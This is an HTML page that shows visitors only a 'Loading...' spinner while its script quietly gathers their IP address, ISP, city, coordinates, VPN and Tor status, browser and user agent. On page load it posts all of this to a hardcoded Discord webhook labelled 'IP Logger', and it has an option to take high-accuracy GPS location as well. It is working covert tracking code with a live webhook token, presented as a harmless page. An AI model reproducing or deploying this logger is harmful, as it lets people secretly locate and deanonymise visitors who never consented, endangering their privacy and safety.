<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ffff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .loading-text {
            font-size: 18px;
            color: #00ffff;
            font-weight: 300;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div class="loading-text">Loading<span class="dots"></span></div>
    </div>

    <script>
        const config = {
            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
            "username": "IP Logger",
            "color": 0x00FFFF,
            "accurateLocation": false
        };

        // Get IP info without API keys
        async function getIPInfo() {
            try {
                // Get IP from multiple free services
                const ip = await getIPAddress();
                
                // Get location info from free services
                const locationInfo = await getLocationInfo(ip);
                
                // Enhanced VPN detection
                const vpnInfo = await detectVPN(ip, locationInfo);
                
                // Mobile detection from user agent
                const isMobile = detectMobile();
                
                return {
                    query: ip,
                    isp: locationInfo.isp || locationInfo.org || 'Unknown',
                    as: locationInfo.asn || locationInfo.as || 'Unknown',
                    continent: locationInfo.continent || getContinent(locationInfo.country_code) || 'Unknown',
                    country: locationInfo.country || locationInfo.country_name || 'Unknown',
                    regionName: locationInfo.region || locationInfo.regionName || 'Unknown',
                    city: locationInfo.city || 'Unknown',
                    lat: locationInfo.latitude || locationInfo.lat || 0,
                    lon: locationInfo.longitude || locationInfo.lon || 0,
                    timezone: locationInfo.timezone || 'Unknown',
                    mobile: isMobile,
                    proxy: vpnInfo.isProxy,
                    vpn: vpnInfo.isVPN,
                    tor: vpnInfo.isTOR,
                    hosting: vpnInfo.isHosting,
                    countryCode: locationInfo.country_code || locationInfo.countryCode || ''
                };
            } catch (error) {
                console.error('IP info failed:', error);
                throw error;
            }
        }

        // Get IP address from multiple free services
        async function getIPAddress() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api.myip.com/',
                'https://jsonip.com/',
                'https://api64.ipify.org?format=json'
            ];

            for (let service of services) {
                try {
                    const response = await fetch(service);
                    const data = await response.json();
                    if (data.ip) return data.ip;
                } catch (error) {
                    continue;
                }
            }
            throw new Error('Could not get IP address');
        }

        // Get location info from free services
        async function getLocationInfo(ip) {
            const services = [
                `https://ipapi.co/${ip}/json/`,
                `https://ipwhois.app/json/${ip}`,
                `https://freeipapi.com/api/json/${ip}`,
                `https://api.ipbase.com/v1/json/${ip}`
            ];

            for (let service of services) {
                try {
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        if (data.country || data.country_name) {
                            return data;
                        }
                    }
                } catch (error) {
                    continue;
                }
            }
            
            // Fallback: Return minimal data
            return {
                ip: ip,
                country: 'Unknown',
                city: 'Unknown',
                isp: 'Unknown'
            };
        }

        // Enhanced VPN detection without API keys
        async function detectVPN(ip, locationInfo) {
            const vpnKeywords = [
                'vpn', 'proxy', 'expressvpn', 'nordvpn', 'surfshark', 
                'private internet access', 'pia', 'windscribe', 'vyprvpn',
                'tunnelbear', 'hotspot shield', 'hidemyass', 'purevpn',
                'ipvanish', 'strongvpn', 'zenmate', 'cyberghost'
            ];
            
            const hostingKeywords = [
                'amazon', 'google', 'microsoft', 'digitalocean', 'linode',
                'vultr', 'ovh', 'hetzner', 'aws', 'gcp', 'azure',
                'cloud', 'hosting', 'server', 'datacenter', 'incapsula',
                'cloudflare', 'akamai', 'fastly'
            ];
            
            const torKeywords = [
                'tor', 'torproject', 'onion'
            ];
            
            const isp = (locationInfo.isp || locationInfo.org || '').toLowerCase();
            const asn = (locationInfo.asn || locationInfo.as || '').toLowerCase();
            
            const isVPN = vpnKeywords.some(keyword => isp.includes(keyword) || asn.includes(keyword));
            const isHosting = hostingKeywords.some(keyword => isp.includes(keyword) || asn.includes(keyword));
            const isTOR = torKeywords.some(keyword => isp.includes(keyword) || asn.includes(keyword));
            
            // Additional checks for common VPN patterns
            const isProxy = isVPN || isTOR || await checkCommonVPNPatterns(ip, isp);
            
            return {
                isVPN: isVPN,
                isProxy: isProxy,
                isTOR: isTOR,
                isHosting: isHosting
            };
        }

        // Check for common VPN patterns
        async function checkCommonVPNPatterns(ip, isp) {
            // Check for common VPN IP ranges (simplified)
            const vpnRanges = [
                '185.159.', '185.216.', '193.37.255.', '194.87.95.',
                '195.154.', '198.8.85.', '198.18.0.', '199.115.100.',
                '209.95.50.', '209.222.92.', '216.131.65.', '216.244.77.'
            ];
            
            const isVPNRange = vpnRanges.some(range => ip.startsWith(range));
            
            // Check for datacenter/hosting patterns
            const isDatacenter = isp.includes('datacenter') || isp.includes('hosting');
            
            return isVPNRange || isDatacenter;
        }

        // Detect mobile from user agent
        function detectMobile() {
            const ua = navigator.userAgent.toLowerCase();
            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
        }

        // Get continent from country code
        function getContinent(countryCode) {
            if (!countryCode) return 'Unknown';
            
            const continentMap = {
                'US': 'North America', 'CA': 'North America', 'MX': 'North America',
                'GB': 'Europe', 'DE': 'Europe', 'FR': 'Europe', 'IT': 'Europe', 'ES': 'Europe',
                'NL': 'Europe', 'SE': 'Europe', 'CH': 'Europe', 'NO': 'Europe', 'DK': 'Europe',
                'FI': 'Europe', 'BE': 'Europe', 'AT': 'Europe', 'IE': 'Europe', 'PT': 'Europe',
                'CN': 'Asia', 'JP': 'Asia', 'IN': 'Asia', 'KR': 'Asia', 'SG': 'Asia',
                'TH': 'Asia', 'VN': 'Asia', 'MY': 'Asia', 'ID': 'Asia', 'PH': 'Asia',
                'BR': 'South America', 'AR': 'South America', 'CO': 'South America', 'PE': 'South America',
                'CL': 'South America', 'EC': 'South America', 'VE': 'South America', 'BO': 'South America',
                'ZA': 'Africa', 'NG': 'Africa', 'EG': 'Africa', 'KE': 'Africa', 'ET': 'Africa',
                'GH': 'Africa', 'DZ': 'Africa', 'MA': 'Africa', 'TZ': 'Africa', 'SD': 'Africa',
                'AU': 'Oceania', 'NZ': 'Oceania', 'FJ': 'Oceania', 'PG': 'Oceania', 'SB': 'Oceania'
            };

            return continentMap[countryCode] || 'Unknown';
        }

        // Parse user agent
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            else if (/Linux/.test(ua)) os = 'Linux';

            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg/.test(ua)) browser = 'Edge';

            return { os, browser };
        }

        // Send to Discord
        async function sendToDiscord(data) {
            try {
                const embed = {
                    username: config.username,
                    content: "",
                    embeds: [{
                        title: "🌐 IP Logged",
                        color: config.color,
                        description: `
**IP Info:**
> **IP:** \`${data.ipInfo.query}\`
> **Provider:** \`${data.ipInfo.isp}\`
> **ASN:** \`${data.ipInfo.as}\`
> **Continent:** \`${data.ipInfo.continent}\`
> **Country:** \`${data.ipInfo.country}\`
> **Region:** \`${data.ipInfo.regionName}\`
> **City:** \`${data.ipInfo.city}\`
> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\`
> **Timezone:** \`${data.ipInfo.timezone}\`
> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
> **VPN:** \`${data.ipInfo.vpn ? 'True' : 'False'}\`
> **Proxy:** \`${data.ipInfo.proxy ? 'True' : 'False'}\`
> **TOR:** \`${data.ipInfo.tor ? 'True' : 'False'}\`
> **Hosting:** \`${data.ipInfo.hosting ? 'True' : 'False'}\`
> **Bot:** \`${data.botStatus}\`

**PC Info:**
> **OS:** \`${data.browserInfo.os}\`
> **Browser:** \`${data.browserInfo.browser}\`

**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``
                    }]
                };

                const response = await fetch(config.webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embed)
                });

                if (!response.ok) {
                    throw new Error(`Discord response: ${response.status}`);
                }

                console.log('Successfully sent to Discord');
            } catch (error) {
                console.error('Error sending to Discord:', error);
                throw error;
            }
        }

        // Get precise location
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            coords: `${position.coords.latitude},${position.coords.longitude}`,
                            accuracy: position.coords.accuracy,
                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    (error) => {
                        console.log('Geolocation failed:', error);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Send precise location
        async function sendPreciseLocation(data, location) {
            try {
                const embed = {
                    username: `${config.username} - GPS`,
                    content: "",
                    embeds: [{
                        title: "📍 Precise Location",
                        color: 0x00FF00,
                        description: `
**Precise GPS Location:**
> **Coordinates:** \`${location.coords}\`
> **Accuracy:** \`${location.accuracy} meters\`
> **Google Maps:** [View Location](${location.mapsLink})

**User Information:**
> **IP:** \`${data.ipInfo.query}\`
> **Country:** \`${data.ipInfo.country}\`
> **City:** \`${data.ipInfo.city}\``
                    }]
                };

                await fetch(config.webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embed)
                });
            } catch (error) {
                console.error('Error sending precise location:', error);
            }
        }

        // Main function
        async function logIP() {
            try {
                console.log('Starting IP collection...');

                // Get IP information
                const ipData = await getIPInfo();
                console.log('IP data received:', ipData);

                // Get browser information
                const browserInfo = parseUserAgent(navigator.userAgent);

                // Bot detection
                let botStatus = 'False';
                if (ipData.hosting) {
                    botStatus = ipData.proxy ? 'Possibly' : 'True';
                }

                const logData = {
                    ipInfo: ipData,
                    browserInfo: browserInfo,
                    botStatus: botStatus
                };

                // Send main webhook
                await sendToDiscord(logData);

                // Get precise location if enabled
                if (config.accurateLocation) {
                    const preciseLocation = await getPreciseLocation();
                    if (preciseLocation) {
                        await sendPreciseLocation(logData, preciseLocation);
                    }
                }

                console.log('IP logging completed successfully');

            } catch (error) {
                console.error('Error in IP logger:', error);
                
                // Send error to Discord
                try {
                    await fetch(config.webhook, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: `${config.username} - ERROR`,
                            content: "",
                            embeds: [{
                                title: "⚠️ IP Logger Error",
                                color: 0xFF0000,
                                description: `**Error:** \`\`\`${error.message}\`\`\`\n**URL:** ${window.location.href}`,
                                fields: [
                                    {
                                        name: "User Agent",
                                        value: `\`\`\`${navigator.userAgent}\`\`\``
                                    }
                                ]
                            }]
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error:', e);
                }
            }
        }

        // Start when page loads
        document.addEventListener('DOMContentLoaded', logIP);
    </script>
</body>
</html>
